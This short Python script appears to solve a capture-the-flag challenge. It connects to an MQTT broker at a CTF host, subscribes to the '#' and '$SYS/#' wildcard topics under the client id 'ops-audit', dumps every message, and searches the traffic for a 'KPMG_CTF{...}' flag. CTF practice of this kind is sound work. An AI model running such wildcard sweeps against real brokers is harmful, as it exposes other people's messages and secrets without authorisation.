#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time, sys, re

HOST, PORT = "0.cloud.chals.io", 28208
TOPICS = sys.argv[1:] or ["#", "$SYS/#"]
FLAG = re.compile(rb"KPMG_CTF\{[^}]*\}")
seen = {}

def on_connect(c, u, flags, rc):
    print(f"[connect] rc={rc}")
    for t in TOPICS:
        c.subscribe(t, qos=0)
        print(f"[subscribe] {t}")

def on_message(c, u, msg):
    key = msg.topic
    retain = "R" if msg.retain else " "
    payload = msg.payload
    seen[key] = payload
    try: disp = payload.decode()
    except: disp = payload.hex()
    print(f"[{retain}] {msg.topic}  =  {disp!r}")
    m = FLAG.search(payload)
    if m: print("\n*** FLAG ***", m.group(0).decode(), "\n")

c = mqtt.Client(client_id="ops-audit", clean_session=True)
c.on_connect = on_connect
c.on_message = on_message
c.connect(HOST, PORT, keepalive=30)
c.loop_start()
time.sleep(10)
c.loop_stop()
print(f"\n[done] {len(seen)} topics seen:")
for t in sorted(seen): print("   ", t)
